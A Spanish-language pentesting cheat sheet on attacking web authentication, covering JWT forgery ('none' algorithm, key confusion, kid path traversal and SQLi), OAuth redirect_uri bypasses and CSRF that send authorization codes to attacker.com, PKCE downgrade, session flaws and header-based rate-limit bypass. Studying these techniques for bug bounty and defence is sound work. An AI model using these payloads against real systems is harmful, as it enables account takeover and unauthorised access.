---
title: "Autenticación Web — JWT, OAuth 2.0, Auth Bypass"
description: "La autenticación moderna se apoya en tres pilares principales: JWT (formato de token), OAuth 2.0 / OIDC (framework de autorización), y Session Management."
category: "Web"
date: 2026-07-18
---
# 🔐 Autenticación Web — JWT, OAuth 2.0, Auth Bypass

La autenticación moderna se apoya en tres pilares principales: **JWT** (formato de token), **OAuth 2.0 / OIDC** (framework de autorización), y **Session Management**. Cada uno tiene su propio conjunto de vulnerabilidades.

---

## 1. JWT Attacks

Los JWTs tienen tres segmentos: `header.payload.signature`. Cada ataque apunta a la relación entre estos.

### Algoritmo None

```json
// Header manipulado
{"alg": "none", "typ": "JWT"}
// Payload
{"sub": "1234", "user": "admin", "role": "admin"}
// Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.
```

Probar variantes: `none`, `None`, `NONE`, `nOnE`

### RS256 → HS256 Key Confusion

Si el servidor usa RS256 (asimétrico) y cambias a HS256 (simétrico), la **clave pública del servidor** se convierte en el secreto HMAC:

```bash
python3 jwt_tool.py <token> -X k -pk public_key.pem
```

### JWK Header Injection

```
{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
```

El servidor extrae la clave pública del header `jwk` sin validar. El atacante genera su propio par de keys y firma con su privada.

### Injections en `kid`

- **Path traversal:** `"kid": "../../etc/passwd"`
- **SQLi:** `"kid": "select * from users"`

### Herramientas

```bash
jwt_tool.py <token> -T                    # Tamper
jwt_tool.py <token> -X a                   # None algorithm
jwt_tool.py <token> -X k -pk pubkey.pem    # Key confusion
python3 jwt-cracker.py <token> -w wordlist.txt  # HMAC brute
```

---

## 2. OAuth 2.0 / OIDC Exploitation

### Redirect URI Manipulation

El ataque más común. Si `redirect_uri` no se valida estrictamente:

```http
GET /authorize?response_type=code&client_id=123&redirect_uri=https://attacker.com&scope=openid
```

**Bypasses comunes:**
```
redirect_uri=https://attacker.com.target.com        # Subdominio
redirect_uri=https://target.com/../attacker          # Path traversal  
redirect_uri=https://target.com/redirect?url=https://attacker.com  # Open redirect
redirect_uri=https://target.com%252eattacker.com     # Double encoding
```

### PKCE Downgrade

Si el servidor **no exige** `code_challenge`, elimínalo:

```http
# Original (con PKCE)
GET /oauth/authorize?client_id=123&code_challenge=ABC&code_challenge_method=S256

# Atacante (sin PKCE)
GET /oauth/authorize?client_id=123
```

### Scope Escalation

Agregar scopes no solicitados:
```
scope=openid%20admin%20write
```

### CSRF en OAuth — State parameter

Si el `state` no está presente o no se valida:

```html
<img src="https://target.com/oauth/authorize?client_id=123&redirect_uri=https://attacker.com&response_type=code&state=STATIC_VALUE">
```

### Unlinked Email Account Takeover
1. Registrarse con email `victim@example.com`
2. Usar OAuth con `victim@example.com` (Google/Apple)
3. Si la app no enlaza cuentas correctamente → ATO

---

## 3. Session Management

### Session Fixation
- No regeneración de session ID tras login
- El atacante pone su session ID en la cookie de la víctima antes de que logee

### Insufficient Session Expiration
- Sesión sigue activa tras logout
- Sesión sigue activa tras cambio de password

### Cookie Attributes
```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
```
Verificar que falte `HttpOnly`, `Secure`, `SameSite`, o que `Domain` sea demasiado permisivo.

---

## 4. Auth Bypass general

### Rate limiting bypass en login
```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
```

### JWT-as-session sin revocación
- El servidor no mantiene blocklist de JWTs inválidos
- No se puede cerrar sesión realmente
- Los tokens robados son válidos hasta su expiración

### Auth via POST body manipulation
```json
{"is_admin": true, "role": "admin", "verified": true}
```

---

## 5. Referencias y CVEs recientes

| CVE | Año | Descripción |
|-----|-----|-------------|
| CVE-2025-54576 | 2025 | OAuth2-Proxy bypass autenticación (CVSS 9.1) |
| CVE-2024-42476 | 2024 | OAuth state parameter CSRF |
| CVE-2024-23647 | 2024 | Authentik PKCE downgrade |
| CVE-2025-4664 | 2025 | Chrome referrer leak en flujo OAuth |

## Relacionado
- **CSRF moderno** — ataques a flujos OAuth, state parameter CSRF
- **Host Header Injection** — password reset poisoning → ATO
- **IDOR** — escalada horizontal/vertical post-auth bypass
- **Metodologia Bug Bounty**
- **NoSQL Injection** — auth bypass via MongoDB $ne/$gt
- **Race Conditions** — MFA/OTP race, password reset race
- **SSRF** — OAuth flows con fetch a `.well-known` manipulable
- **XSS y bypass CSP** — token theft via XSS
- **Claude-BugHunter** (skills `hunt-auth-bypass`, `hunt-oauth`, `hunt-session`)
- **Web HTB Academy**
